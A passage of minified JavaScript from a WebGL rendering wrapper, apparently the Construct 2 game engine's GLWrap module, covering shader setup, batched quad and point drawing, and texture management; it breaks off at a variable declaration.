            for (u.extendBoxHorizontal = t.extendBoxHorizontal || 0, u.extendBoxVertical = t.extendBoxVertical || 0, u.crossSampling = !!t.crossSampling, u.preservesOpaqueness = !!t.preservesOpaqueness, u.animated = !!t.animated, u.parameters = t.parameters || [], c = 0, l = u.parameters.length; c < l; c++) u.parameters[c][1] = r.getUniformLocation(h, u.parameters[c][0]), u.lastCustomParams.push(0), r.uniform1f(u.parameters[c][1], 0);
            return cr.seal(u), u
        }, i.prototype.getShaderIndex = function (t) {
            var e, i;
            for (e = 0, i = this.shaderPrograms.length; e < i; e++)
                if (this.shaderPrograms[e].name === t) return e;
            return -1
        }, i.prototype.project = function (t, e, i) {
            var n = this.matMV,
                r = this.matP,
                s = [0, 0, 0, 0, 0, 0, 0, 0];
            s[0] = n[0] * t + n[4] * e + n[12], s[1] = n[1] * t + n[5] * e + n[13], s[2] = n[2] * t + n[6] * e + n[14], s[3] = n[3] * t + n[7] * e + n[15], s[4] = r[0] * s[0] + r[4] * s[1] + r[8] * s[2] + r[12] * s[3], s[5] = r[1] * s[0] + r[5] * s[1] + r[9] * s[2] + r[13] * s[3], s[6] = r[2] * s[0] + r[6] * s[1] + r[10] * s[2] + r[14] * s[3], s[7] = -s[2], 0 !== s[7] && (s[7] = 1 / s[7], s[4] *= s[7], s[5] *= s[7], s[6] *= s[7], i[0] = (.5 * s[4] + .5) * this.width, i[1] = (.5 * s[5] + .5) * this.height)
        }, i.prototype.setSize = function (t, e, i) {
            if (this.width !== t || this.height !== e || i) {
                this.endBatch();
                var n, r, s, o = this.gl;
                if (this.width = t, this.height = e, o.viewport(0, 0, t, e), mat4.lookAt(this.cam, this.look, this.up, this.matMV), this.enableFrontToBack) mat4.ortho(-t / 2, t / 2, e / 2, -e / 2, this.zNear, this.zFar, this.matP), this.worldScale[0] = 1, this.worldScale[1] = 1;
                else {
                    mat4.perspective(45, t / e, this.zNear, this.zFar, this.matP);
                    var a = [0, 0],
                        h = [0, 0];
                    this.project(0, 0, a), this.project(1, 1, h), this.worldScale[0] = 1 / (h[0] - a[0]), this.worldScale[1] = -1 / (h[1] - a[1])
                }
                for (n = 0, r = this.shaderPrograms.length; n < r; n++)(s = this.shaderPrograms[n]).hasCurrentMatMV = !1, s.locMatP && (o.useProgram(s.shaderProgram), o.uniformMatrix4fv(s.locMatP, !1, this.matP));
                o.useProgram(this.shaderPrograms[this.lastProgram].shaderProgram), o.bindTexture(o.TEXTURE_2D, null), o.activeTexture(o.TEXTURE1), o.bindTexture(o.TEXTURE_2D, null), o.activeTexture(o.TEXTURE0), this.lastTexture0 = null, this.lastTexture1 = null, this.depthBuffer && (o.bindFramebuffer(o.FRAMEBUFFER, this.fbo), o.bindRenderbuffer(o.RENDERBUFFER, this.depthBuffer), o.renderbufferStorage(o.RENDERBUFFER, o.DEPTH_COMPONENT16, this.width, this.height), this.attachedDepthBuffer || (o.framebufferRenderbuffer(o.FRAMEBUFFER, o.DEPTH_ATTACHMENT, o.RENDERBUFFER, this.depthBuffer), this.attachedDepthBuffer = !0), o.bindRenderbuffer(o.RENDERBUFFER, null), o.bindFramebuffer(o.FRAMEBUFFER, null), this.renderToTex = null)
            }
        }, i.prototype.resetModelView = function () {
            mat4.lookAt(this.cam, this.look, this.up, this.matMV), mat4.scale(this.matMV, this.worldScale)
        }, i.prototype.translate = function (t, e) {
            0 === t && 0 === e || (this.tmpVec3[0] = t, this.tmpVec3[1] = e, this.tmpVec3[2] = 0, mat4.translate(this.matMV, this.tmpVec3))
        }, i.prototype.scale = function (t, e) {
            1 === t && 1 === e || (this.tmpVec3[0] = t, this.tmpVec3[1] = e, this.tmpVec3[2] = 1, mat4.scale(this.matMV, this.tmpVec3))
        }, i.prototype.rotateZ = function (t) {
            0 !== t && mat4.rotateZ(this.matMV, t)
        }, i.prototype.updateModelView = function () {
            if (!r(this.lastMV, this.matMV)) {
                var t = this.pushBatch();
                t.type = 5, t.mat4param ? mat4.set(this.matMV, t.mat4param) : t.mat4param = mat4.create(this.matMV), mat4.set(this.matMV, this.lastMV), this.hasQuadBatchTop = !1, this.hasPointBatchTop = !1
            }
        }, i.prototype.setEarlyZIndex = function (t) {
            this.enableFrontToBack && (t > 32760 && (t = 32760), this.currentZ = this.cam[2] - this.zNear - t * this.zIncrement)
        }, s.prototype.doSetEarlyZPass = function () {
            var t = this.gl,
                e = this.glwrap;
            0 !== this.startIndex ? (t.depthMask(!0), t.colorMask(!1, !1, !1, !1), t.disable(t.BLEND), t.bindFramebuffer(t.FRAMEBUFFER, e.fbo), t.framebufferTexture2D(t.FRAMEBUFFER, t.COLOR_ATTACHMENT0, t.TEXTURE_2D, null, 0), t.clear(t.DEPTH_BUFFER_BIT), t.bindFramebuffer(t.FRAMEBUFFER, null), e.isBatchInEarlyZPass = !0) : (t.depthMask(!1), t.colorMask(!0, !0, !0, !0), t.enable(t.BLEND), e.isBatchInEarlyZPass = !1)
        }, s.prototype.doSetTexture = function () {
            this.gl.bindTexture(this.gl.TEXTURE_2D, this.texParam)
        }, s.prototype.doSetTexture1 = function () {
            var t = this.gl;
            t.activeTexture(t.TEXTURE1), t.bindTexture(t.TEXTURE_2D, this.texParam), t.activeTexture(t.TEXTURE0)
        }, s.prototype.doSetOpacity = function () {
            var t = this.opacityParam,
                e = this.glwrap;
            e.currentOpacity = t;
            var i = e.currentShader;
            i.locOpacity && i.lpOpacity !== t && (i.lpOpacity = t, this.gl.uniform1f(i.locOpacity, t))
        }, s.prototype.doQuad = function () {
            this.gl.drawElements(this.gl.TRIANGLES, this.indexCount, this.gl.UNSIGNED_SHORT, this.startIndex)
        }, s.prototype.doSetBlend = function () {
            this.gl.blendFunc(this.startIndex, this.indexCount)
        }, s.prototype.doUpdateModelView = function () {
            var t, e, i, n = this.glwrap.shaderPrograms,
                r = this.glwrap.currentProgram;
            for (t = 0, e = n.length; t < e; t++) i = n[t], t === r && i.locMatMV ? (i.updateMatMV(this.mat4param), i.hasCurrentMatMV = !0) : i.hasCurrentMatMV = !1;
            mat4.set(this.mat4param, this.glwrap.currentMV)
        }, s.prototype.doRenderToTexture = function () {
            var t = this.gl,
                e = this.glwrap;
            this.texParam ? (e.lastTexture1 === this.texParam && (t.activeTexture(t.TEXTURE1), t.bindTexture(t.TEXTURE_2D, null), e.lastTexture1 = null, t.activeTexture(t.TEXTURE0)), t.bindFramebuffer(t.FRAMEBUFFER, e.fbo), e.isBatchInEarlyZPass || t.framebufferTexture2D(t.FRAMEBUFFER, t.COLOR_ATTACHMENT0, t.TEXTURE_2D, this.texParam, 0)) : (e.enableFrontToBack || t.framebufferTexture2D(t.FRAMEBUFFER, t.COLOR_ATTACHMENT0, t.TEXTURE_2D, null, 0), t.bindFramebuffer(t.FRAMEBUFFER, null))
        }, s.prototype.doClear = function () {
            var t = this.gl,
                e = this.startIndex;
            0 === e ? (t.clearColor(this.mat4param[0], this.mat4param[1], this.mat4param[2], this.mat4param[3]), t.clear(t.COLOR_BUFFER_BIT)) : 1 === e ? (t.enable(t.SCISSOR_TEST), t.scissor(this.mat4param[0], this.mat4param[1], this.mat4param[2], this.mat4param[3]), t.clearColor(0, 0, 0, 0), t.clear(t.COLOR_BUFFER_BIT), t.disable(t.SCISSOR_TEST)) : t.clear(t.DEPTH_BUFFER_BIT)
        }, s.prototype.doSetDepthTestEnabled = function () {
            var t = this.gl;
            0 !== this.startIndex ? t.enable(t.DEPTH_TEST) : t.disable(t.DEPTH_TEST)
        }, s.prototype.doPoints = function () {
            var t = this.gl,
                e = this.glwrap;
            e.enableFrontToBack && t.disable(t.DEPTH_TEST);
            var i = e.shaderPrograms[1];
            t.useProgram(i.shaderProgram), !i.hasCurrentMatMV && i.locMatMV && (i.updateMatMV(e.currentMV), i.hasCurrentMatMV = !0), t.enableVertexAttribArray(i.locAPos), t.bindBuffer(t.ARRAY_BUFFER, e.pointBuffer), t.vertexAttribPointer(i.locAPos, 4, t.FLOAT, !1, 0, 0), t.drawArrays(t.POINTS, this.startIndex / 4, this.indexCount), i = e.currentShader, t.useProgram(i.shaderProgram), i.locAPos >= 0 && (t.enableVertexAttribArray(i.locAPos), t.bindBuffer(t.ARRAY_BUFFER, e.vertexBuffers[e.curBuffer]), t.vertexAttribPointer(i.locAPos, e.enableFrontToBack ? 3 : 2, t.FLOAT, !1, 0, 0)), i.locATex >= 0 && (t.enableVertexAttribArray(i.locATex), t.bindBuffer(t.ARRAY_BUFFER, e.texcoordBuffers[e.curBuffer]), t.vertexAttribPointer(i.locATex, 2, t.FLOAT, !1, 0, 0)), e.enableFrontToBack && t.enable(t.DEPTH_TEST)
        }, s.prototype.doSetProgram = function () {
            var t = this.gl,
                e = this.glwrap,
                i = e.shaderPrograms[this.startIndex];
            e.currentProgram = this.startIndex, e.currentShader = i, t.useProgram(i.shaderProgram), !i.hasCurrentMatMV && i.locMatMV && (i.updateMatMV(e.currentMV), i.hasCurrentMatMV = !0), i.locOpacity && i.lpOpacity !== e.currentOpacity && (i.lpOpacity = e.currentOpacity, t.uniform1f(i.locOpacity, e.currentOpacity)), i.locAPos >= 0 && (t.enableVertexAttribArray(i.locAPos), t.bindBuffer(t.ARRAY_BUFFER, e.vertexBuffers[e.curBuffer]), t.vertexAttribPointer(i.locAPos, e.enableFrontToBack ? 3 : 2, t.FLOAT, !1, 0, 0)), i.locATex >= 0 && (t.enableVertexAttribArray(i.locATex), t.bindBuffer(t.ARRAY_BUFFER, e.texcoordBuffers[e.curBuffer]), t.vertexAttribPointer(i.locATex, 2, t.FLOAT, !1, 0, 0))
        }, s.prototype.doSetColor = function () {
            var t = this.glwrap.currentShader,
                e = this.mat4param;
            this.gl.uniform4f(t.locColorFill, e[0], e[1], e[2], e[3])
        }, s.prototype.doSetProgramParameters = function () {
            var t, e, i = this.glwrap.currentShader,
                n = this.gl,
                r = this.mat4param;
            i.locSamplerBack && this.glwrap.lastTexture1 !== this.texParam && (n.activeTexture(n.TEXTURE1), n.bindTexture(n.TEXTURE_2D, this.texParam), this.glwrap.lastTexture1 = this.texParam, n.activeTexture(n.TEXTURE0));
            var s, o = r[0];
            if (i.locPixelWidth && o !== i.lpPixelWidth && (i.lpPixelWidth = o, n.uniform1f(i.locPixelWidth, o)), o = r[1], i.locPixelHeight && o !== i.lpPixelHeight && (i.lpPixelHeight = o, n.uniform1f(i.locPixelHeight, o)), o = r[2], s = r[3], !i.locDestStart || o === i.lpDestStartX && s === i.lpDestStartY || (i.lpDestStartX = o, i.lpDestStartY = s, n.uniform2f(i.locDestStart, o, s)), o = r[4], s = r[5], !i.locDestEnd || o === i.lpDestEndX && s === i.lpDestEndY || (i.lpDestEndX = o, i.lpDestEndY = s, n.uniform2f(i.locDestEnd, o, s)), o = r[6], i.locLayerScale && o !== i.lpLayerScale && (i.lpLayerScale = o, n.uniform1f(i.locLayerScale, o)), o = r[7], i.locLayerAngle && o !== i.lpLayerAngle && (i.lpLayerAngle = o, n.uniform1f(i.locLayerAngle, o)), o = r[8], s = r[9], !i.locViewOrigin || o === i.lpViewOriginX && s === i.lpViewOriginY || (i.lpViewOriginX = o, i.lpViewOriginY = s, n.uniform2f(i.locViewOrigin, o, s)), o = r[10], s = r[11], !i.locScrollPos || o === i.lpScrollPosX && s === i.lpScrollPosY || (i.lpScrollPosX = o, i.lpScrollPosY = s, n.uniform2f(i.locScrollPos, o, s)), o = r[12], i.locSeconds && o !== i.lpSeconds && (i.lpSeconds = o, n.uniform1f(i.locSeconds, o)), i.parameters.length)
                for (t = 0, e = i.parameters.length; t < e; t++)(o = this.shaderParams[t]) !== i.lastCustomParams[t] && (i.lastCustomParams[t] = o, n.uniform1f(i.parameters[t][1], o))
        }, i.prototype.pushBatch = function () {
            return this.batchPtr === this.batch.length && this.batch.push(new s(0, this)), this.batch[this.batchPtr++]
        }, i.prototype.endBatch = function () {
            if (0 !== this.batchPtr && !this.gl.isContextLost()) {
                var t, e, i, n = this.gl;
                if (this.pointPtr > 0 && (n.bindBuffer(n.ARRAY_BUFFER, this.pointBuffer), n.bufferSubData(n.ARRAY_BUFFER, 0, this.pointData.subarray(0, this.pointPtr)), r && r.locAPos >= 0 && "<point>" === r.name && n.vertexAttribPointer(r.locAPos, 4, n.FLOAT, !1, 0, 0)), this.vertexPtr > 0) {
                    var r = this.currentShader;
                    n.bindBuffer(n.ARRAY_BUFFER, this.vertexBuffers[this.curBuffer]), n.bufferSubData(n.ARRAY_BUFFER, 0, this.vertexData.subarray(0, this.vertexPtr)), r && r.locAPos >= 0 && "<point>" !== r.name && n.vertexAttribPointer(r.locAPos, this.enableFrontToBack ? 3 : 2, n.FLOAT, !1, 0, 0), n.bindBuffer(n.ARRAY_BUFFER, this.texcoordBuffers[this.curBuffer]), n.bufferSubData(n.ARRAY_BUFFER, 0, this.texcoordData.subarray(0, this.texPtr)), r && r.locATex >= 0 && "<point>" !== r.name && n.vertexAttribPointer(r.locATex, 2, n.FLOAT, !1, 0, 0)
                }
                for (t = 0, e = this.batchPtr; t < e; t++) switch ((i = this.batch[t]).type) {
                    case 1:
                        i.doQuad();
                        break;
                    case 2:
                        i.doSetTexture();
                        break;
                    case 3:
                        i.doSetOpacity();
                        break;
                    case 4:
                        i.doSetBlend();
                        break;
                    case 5:
                        i.doUpdateModelView();
                        break;
                    case 6:
                        i.doRenderToTexture();
                        break;
                    case 7:
                        i.doClear();
                        break;
                    case 8:
                        i.doPoints();
                        break;
                    case 9:
                        i.doSetProgram();
                        break;
                    case 10:
                        i.doSetProgramParameters();
                        break;
                    case 11:
                        i.doSetTexture1();
                        break;
                    case 12:
                        i.doSetColor();
                        break;
                    case 13:
                        i.doSetDepthTestEnabled();
                        break;
                    case 14:
                        i.doSetEarlyZPass();
                        break
                }
                this.batchPtr = 0, this.vertexPtr = 0, this.texPtr = 0, this.pointPtr = 0, this.hasQuadBatchTop = !1, this.hasPointBatchTop = !1, this.isBatchInEarlyZPass = !1, this.curBuffer++, this.curBuffer >= 4 && (this.curBuffer = 0)
            }
        }, i.prototype.setOpacity = function (t) {
            if (t !== this.lastOpacity && !this.isEarlyZPass) {
                var e = this.pushBatch();
                e.type = 3, e.opacityParam = t, this.lastOpacity = t, this.hasQuadBatchTop = !1, this.hasPointBatchTop = !1
            }
        }, i.prototype.setTexture = function (t) {
            if (t !== this.lastTexture0) {
                var e = this.pushBatch();
                e.type = 2, e.texParam = t, this.lastTexture0 = t, this.hasQuadBatchTop = !1, this.hasPointBatchTop = !1
            }
        }, i.prototype.setBlend = function (t, e) {
            if ((t !== this.lastSrcBlend || e !== this.lastDestBlend) && !this.isEarlyZPass) {
                var i = this.pushBatch();
                i.type = 4, i.startIndex = t, i.indexCount = e, this.lastSrcBlend = t, this.lastDestBlend = e, this.hasQuadBatchTop = !1, this.hasPointBatchTop = !1
            }
        }, i.prototype.isPremultipliedAlphaBlend = function () {
            return this.lastSrcBlend === this.gl.ONE && this.lastDestBlend === this.gl.ONE_MINUS_SRC_ALPHA
        }, i.prototype.setAlphaBlend = function () {
            this.setBlend(this.gl.ONE, this.gl.ONE_MINUS_SRC_ALPHA)
        }, i.prototype.setNoPremultiplyAlphaBlend = function () {
            this.setBlend(this.gl.SRC_ALPHA, this.gl.ONE_MINUS_SRC_ALPHA)
        };
        var o = 15992;
        i.prototype.quad = function (t, e, i, n, r, s, a, h) {
            this.vertexPtr >= o && this.endBatch();
            var c = this.vertexPtr,
                l = this.texPtr,
                u = this.vertexData,
                p = this.texcoordData,
                d = this.currentZ;
            if (this.hasQuadBatchTop) this.batch[this.batchPtr - 1].indexCount += 6;
            else {
                var f = this.pushBatch();
                f.type = 1, f.startIndex = this.enableFrontToBack ? c : c / 2 * 3, f.indexCount = 6, this.hasQuadBatchTop = !0, this.hasPointBatchTop = !1
            }
            this.enableFrontToBack ? (u[c++] = t, u[c++] = e, u[c++] = d, u[c++] = i, u[c++] = n, u[c++] = d, u[c++] = r, u[c++] = s, u[c++] = d, u[c++] = a, u[c++] = h, u[c++] = d) : (u[c++] = t, u[c++] = e, u[c++] = i, u[c++] = n, u[c++] = r, u[c++] = s, u[c++] = a, u[c++] = h), p[l++] = 0, p[l++] = 0, p[l++] = 1, p[l++] = 0, p[l++] = 1, p[l++] = 1, p[l++] = 0, p[l++] = 1, this.vertexPtr = c, this.texPtr = l
        }, i.prototype.quadTex = function (t, e, i, n, r, s, a, h, c) {
            this.vertexPtr >= o && this.endBatch();
            var l = this.vertexPtr,
                u = this.texPtr,
                p = this.vertexData,
                d = this.texcoordData,
                f = this.currentZ;
            if (this.hasQuadBatchTop) this.batch[this.batchPtr - 1].indexCount += 6;
            else {
                var m = this.pushBatch();
                m.type = 1, m.startIndex = this.enableFrontToBack ? l : l / 2 * 3, m.indexCount = 6, this.hasQuadBatchTop = !0, this.hasPointBatchTop = !1
            }
            var g = c.left,
                y = c.top,
                _ = c.right,
                v = c.bottom;
            this.enableFrontToBack ? (p[l++] = t, p[l++] = e, p[l++] = f, p[l++] = i, p[l++] = n, p[l++] = f, p[l++] = r, p[l++] = s, p[l++] = f, p[l++] = a, p[l++] = h, p[l++] = f) : (p[l++] = t, p[l++] = e, p[l++] = i, p[l++] = n, p[l++] = r, p[l++] = s, p[l++] = a, p[l++] = h), d[u++] = g, d[u++] = y, d[u++] = _, d[u++] = y, d[u++] = _, d[u++] = v, d[u++] = g, d[u++] = v, this.vertexPtr = l, this.texPtr = u
        }, i.prototype.quadTexUV = function (t, e, i, n, r, s, a, h, c, l, u, p, d, f, m, g) {
            this.vertexPtr >= o && this.endBatch();
            var y = this.vertexPtr,
                _ = this.texPtr,
                v = this.vertexData,
                b = this.texcoordData,
                w = this.currentZ;
            if (this.hasQuadBatchTop) this.batch[this.batchPtr - 1].indexCount += 6;
            else {
                var x = this.pushBatch();
                x.type = 1, x.startIndex = this.enableFrontToBack ? y : y / 2 * 3, x.indexCount = 6, this.hasQuadBatchTop = !0, this.hasPointBatchTop = !1
            }
            this.enableFrontToBack ? (v[y++] = t, v[y++] = e, v[y++] = w, v[y++] = i, v[y++] = n, v[y++] = w, v[y++] = r, v[y++] = s, v[y++] = w, v[y++] = a, v[y++] = h, v[y++] = w) : (v[y++] = t, v[y++] = e, v[y++] = i, v[y++] = n, v[y++] = r, v[y++] = s, v[y++] = a, v[y++] = h), b[_++] = c, b[_++] = l, b[_++] = u, b[_++] = p, b[_++] = d, b[_++] = f, b[_++] = m, b[_++] = g, this.vertexPtr = y, this.texPtr = _
        }, i.prototype.convexPoly = function (t) {
            var e, i, n, r, s, o, a, h, c = t.length / 2 - 2,
                l = c - 1,
                u = t[0],
                p = t[1];
            for (e = 0; e < c; e += 2) n = t[(i = 2 * e) + 2], r = t[i + 3], s = t[i + 4], o = t[i + 5], e === l ? this.quad(u, p, n, r, s, o, s, o) : (a = t[i + 6], h = t[i + 7], this.quad(u, p, n, r, s, o, a, h))
        };
        i.prototype.point = function (t, e, i, n) {
            this.pointPtr >= 7996 && this.endBatch();
            var r = this.pointPtr,
                s = this.pointData;
            if (this.hasPointBatchTop) this.batch[this.batchPtr - 1].indexCount++;
            else {
                var o = this.pushBatch();
                o.type = 8, o.startIndex = r, o.indexCount = 1, this.hasPointBatchTop = !0, this.hasQuadBatchTop = !1
            }
            s[r++] = t, s[r++] = e, s[r++] = i, s[r++] = n, this.pointPtr = r
        }, i.prototype.switchProgram = function (t) {
            if (this.lastProgram !== t) {
                var e = this.shaderPrograms[t];
                if (!e) {
                    if (0 === this.lastProgram) return;
                    t = 0, e = this.shaderPrograms[0]
                }
                var i = this.pushBatch();
                i.type = 9, i.startIndex = t, this.lastProgram = t, this.hasQuadBatchTop = !1, this.hasPointBatchTop = !1
            }
        }, i.prototype.programUsesDest = function (t) {
            var e = this.shaderPrograms[t];
            return !(!e.locDestStart && !e.locDestEnd)
        }, i.prototype.programUsesCrossSampling = function (t) {
            var e = this.shaderPrograms[t];
            return !!(e.locDestStart || e.locDestEnd || e.crossSampling)
        }, i.prototype.programPreservesOpaqueness = function (t) {
            return this.shaderPrograms[t].preservesOpaqueness
        }, i.prototype.programExtendsBox = function (t) {
            var e = this.shaderPrograms[t];
            return 0 !== e.extendBoxHorizontal || 0 !== e.extendBoxVertical
        }, i.prototype.getProgramBoxExtendHorizontal = function (t) {
            return this.shaderPrograms[t].extendBoxHorizontal
        }, i.prototype.getProgramBoxExtendVertical = function (t) {
            return this.shaderPrograms[t].extendBoxVertical
        }, i.prototype.getProgramParameterType = function (t, e) {
            return this.shaderPrograms[t].parameters[e][2]
        }, i.prototype.programIsAnimated = function (t) {
            return this.shaderPrograms[t].animated
        }, i.prototype.setProgramParameters = function (t, e, i, n, r, s, o, a, h, c, l, u, p, d, f) {
            var m, g, y, _, v, b = this.shaderPrograms[this.lastProgram];
            if (b.hasAnyOptionalUniforms || f.length) {
                if ((y = this.pushBatch()).type = 10, y.mat4param ? mat4.set(this.matMV, y.mat4param) : y.mat4param = mat4.create(), (_ = y.mat4param)[0] = e, _[1] = i, _[2] = n, _[3] = r, _[4] = s, _[5] = o, _[6] = a, _[7] = h, _[8] = c, _[9] = l, _[10] = u, _[11] = p, _[12] = d, b.locSamplerBack ? y.texParam = t : y.texParam = null, f.length)
                    for ((v = y.shaderParams).length = f.length, m = 0, g = f.length; m < g; m++) v[m] = f[m];
                this.hasQuadBatchTop = !1, this.hasPointBatchTop = !1
            }
        }, i.prototype.clear = function (t, e, i, n) {
            var r = this.pushBatch();
            r.type = 7, r.startIndex = 0, r.mat4param || (r.mat4param = mat4.create()), r.mat4param[0] = t, r.mat4param[1] = e, r.mat4param[2] = i, r.mat4param[3] = n, this.hasQuadBatchTop = !1, this.hasPointBatchTop = !1
        }, i.prototype.clearRect = function (t, e, i, n) {
            if (!(i < 0 || n < 0)) {
                var r = this.pushBatch();
                r.type = 7, r.startIndex = 1, r.mat4param || (r.mat4param = mat4.create()), r.mat4param[0] = t, r.mat4param[1] = e, r.mat4param[2] = i, r.mat4param[3] = n, this.hasQuadBatchTop = !1, this.hasPointBatchTop = !1
            }
        }, i.prototype.clearDepth = function () {
            var t = this.pushBatch();
            t.type = 7, t.startIndex = 2, this.hasQuadBatchTop = !1, this.hasPointBatchTop = !1
        }, i.prototype.setEarlyZPass = function (t) {
            if (this.enableFrontToBack && (t = !!t, this.isEarlyZPass !== t)) {
                var e = this.pushBatch();
                e.type = 14, e.startIndex = t ? 1 : 0, this.hasQuadBatchTop = !1, this.hasPointBatchTop = !1, this.isEarlyZPass = t, this.renderToTex = null, this.isEarlyZPass ? this.switchProgram(2) : this.switchProgram(0)
            }
        }, i.prototype.setDepthTestEnabled = function (t) {
            if (this.enableFrontToBack) {
                var e = this.pushBatch();
                e.type = 13, e.startIndex = t ? 1 : 0, this.hasQuadBatchTop = !1, this.hasPointBatchTop = !1
            }
        }, i.prototype.fullscreenQuad = function () {
            mat4.set(this.lastMV, e), this.resetModelView(), this.updateModelView();
            var t = this.width / 2,
                i = this.height / 2;
            this.quad(-t, i, t, i, t, -i, -t, -i), mat4.set(e, this.matMV), this.updateModelView()
        }, i.prototype.setColorFillMode = function (t, e, i, n) {
            this.switchProgram(3);
            var r = this.pushBatch();
            r.type = 12, r.mat4param || (r.mat4param = mat4.create()), r.mat4param[0] = t, r.mat4param[1] = e, r.mat4param[2] = i, r.mat4param[3] = n, this.hasQuadBatchTop = !1, this.hasPointBatchTop = !1
        }, i.prototype.setTextureFillMode = function () {
            this.switchProgram(0)
        }, i.prototype.restoreEarlyZMode = function () {
            this.switchProgram(2)
        }, i.prototype.present = function () {
            this.endBatch(), this.gl.flush()
        };
        var a = [],
            h = {};
        i.prototype.contextLost = function () {
            cr.clearArray(a), h = {}
        };
        i.prototype.loadTexture = function (t, e, i, n, r, s) {
            e = !!e, i = !!i;
            var o = t.src + "," + e + "," + i + (e ? "," + r : ""),
                c = null;
            if (void 0 !== t.src && h.hasOwnProperty(o)) return (c = h[o]).c2refcount++, c;
            this.endBatch();
            var l = this.gl,
                u = cr.isPOT(t.width) && cr.isPOT(t.height);
            c = l.createTexture(), l.bindTexture(l.TEXTURE_2D, c), l.pixelStorei(l.UNPACK_PREMULTIPLY_ALPHA_WEBGL, !0);
            var p = l.RGBA,
                d = l.RGBA,
                f = l.UNSIGNED_BYTE;
            if (n && !this.isIE) switch (n) {
                case 1:
                    p = l.RGB, d = l.RGB;
                    break;
                case 2:
                    f = l.UNSIGNED_SHORT_4_4_4_4;
                    break;
                case 3:
                    f = l.UNSIGNED_SHORT_5_5_5_1;
                    break;
                case 4:
                    p = l.RGB, d = l.RGB, f = l.UNSIGNED_SHORT_5_6_5;
                    break
            }
            if (1 === this.version && !u && e) {
                var m = document.createElement("canvas");
                m.width = cr.nextHighestPowerOfTwo(t.width), m.height = cr.nextHighestPowerOfTwo(t.height);
                var g = m.getContext("2d");
                void 0 !== g.imageSmoothingEnabled ? g.imageSmoothingEnabled = i : (g.webkitImageSmoothingEnabled = i, g.mozImageSmoothingEnabled = i, g.msImageSmoothingEnabled = i), g.drawImage(t, 0, 0, t.width, t.height, 0, 0, m.width, m.height), l.texImage2D(l.TEXTURE_2D, 0, p, d, f, m)
            } else l.texImage2D(l.TEXTURE_2D, 0, p, d, f, t);
            return e ? "repeat-x" === r ? (l.texParameteri(l.TEXTURE_2D, l.TEXTURE_WRAP_S, l.REPEAT), l.texParameteri(l.TEXTURE_2D, l.TEXTURE_WRAP_T, l.CLAMP_TO_EDGE)) : "repeat-y" === r ? (l.texParameteri(l.TEXTURE_2D, l.TEXTURE_WRAP_S, l.CLAMP_TO_EDGE), l.texParameteri(l.TEXTURE_2D, l.TEXTURE_WRAP_T, l.REPEAT)) : (l.texParameteri(l.TEXTURE_2D, l.TEXTURE_WRAP_S, l.REPEAT), l.texParameteri(l.TEXTURE_2D, l.TEXTURE_WRAP_T, l.REPEAT)) : (l.texParameteri(l.TEXTURE_2D, l.TEXTURE_WRAP_S, l.CLAMP_TO_EDGE), l.texParameteri(l.TEXTURE_2D, l.TEXTURE_WRAP_T, l.CLAMP_TO_EDGE)), i ? (l.texParameteri(l.TEXTURE_2D, l.TEXTURE_MAG_FILTER, l.LINEAR), (u || this.version >= 2) && this.enable_mipmaps && !s ? (l.texParameteri(l.TEXTURE_2D, l.TEXTURE_MIN_FILTER, l.LINEAR_MIPMAP_LINEAR), l.generateMipmap(l.TEXTURE_2D)) : l.texParameteri(l.TEXTURE_2D, l.TEXTURE_MIN_FILTER, l.LINEAR)) : (l.texParameteri(l.TEXTURE_2D, l.TEXTURE_MAG_FILTER, l.NEAREST), l.texParameteri(l.TEXTURE_2D, l.TEXTURE_MIN_FILTER, l.NEAREST)), l.bindTexture(l.TEXTURE_2D, null), this.lastTexture0 = null, c.c2width = t.width, c.c2height = t.height, c.c2refcount = 1, c.c2texkey = o, a.push(c), h[o] = c, c
        }, i.prototype.createEmptyTexture = function (t, e, i, n, r) {
            this.endBatch();
            var s = this.gl;
            this.isIE && (n = !1);
            var o = s.createTexture();
            return s.bindTexture(s.TEXTURE_2D, o), s.texImage2D(s.TEXTURE_2D, 0, s.RGBA, t, e, 0, s.RGBA, n ? s.UNSIGNED_SHORT_4_4_4_4 : s.UNSIGNED_BYTE, null), r ? (s.texParameteri(s.TEXTURE_2D, s.TEXTURE_WRAP_S, s.REPEAT), s.texParameteri(s.TEXTURE_2D, s.TEXTURE_WRAP_T, s.REPEAT)) : (s.texParameteri(s.TEXTURE_2D, s.TEXTURE_WRAP_S, s.CLAMP_TO_EDGE), s.texParameteri(s.TEXTURE_2D, s.TEXTURE_WRAP_T, s.CLAMP_TO_EDGE)), s.texParameteri(s.TEXTURE_2D, s.TEXTURE_MAG_FILTER, i ? s.LINEAR : s.NEAREST), s.texParameteri(s.TEXTURE_2D, s.TEXTURE_MIN_FILTER, i ? s.LINEAR : s.NEAREST), s.bindTexture(s.TEXTURE_2D, null), this.lastTexture0 = null, o.c2width = t, o.c2height = e, a.push(o), o
        }, i.prototype.videoToTexture = function (t, e, i) {
            this.endBatch();
            var n = this.gl;
            this.isIE && (i = !1), n.bindTexture(n.TEXTURE_2D, e), n.pixelStorei(n.UNPACK_PREMULTIPLY_ALPHA_WEBGL, !0);
            try {
                n.texImage2D(n.TEXTURE_2D, 0, n.RGBA, n.RGBA, i ? n.UNSIGNED_SHORT_4_4_4_4 : n.UNSIGNED_BYTE, t)
            } catch (t) {
                console && console.error
            }
            n.bindTexture(n.TEXTURE_2D, null), this.lastTexture0 = null
        }, i.prototype.deleteTexture = function (t) {
            t && (void 0 !== t.c2refcount && t.c2refcount > 1 ? t.c2refcount-- : (this.endBatch(), t === this.lastTexture0 && (this.gl.bindTexture(this.gl.TEXTURE_2D, null), this.lastTexture0 = null), t === this.lastTexture1 && (this.gl.activeTexture(this.gl.TEXTURE1), this.gl.bindTexture(this.gl.TEXTURE_2D, null), this.gl.activeTexture(this.gl.TEXTURE0), this.lastTexture1 = null), cr.arrayFindRemove(a, t), void 0 !== t.c2texkey && delete h[t.c2texkey], this.gl.deleteTexture(t)))
        }, i.prototype.estimateVRAM = function () {
            var t, e, i, n = this.width * this.height * 4 * 2;
            for (t = 0, e = a.length; t < e; t++) n += (i = a[t]).c2width * i.c2height * 4;
            return n
        }, i.prototype.textureCount = function () {
            return a.length
        }, i.prototype.setRenderingToTexture = function (t) {
            if (t !== this.renderToTex) {
                var e = this.pushBatch();
                e.type = 6, e.texParam = t, this.renderToTex = t, this.hasQuadBatchTop = !1, this.hasPointBatchTop = !1
            }
        }, cr.GLWrap = i
    }();
var _counterGD = 0,
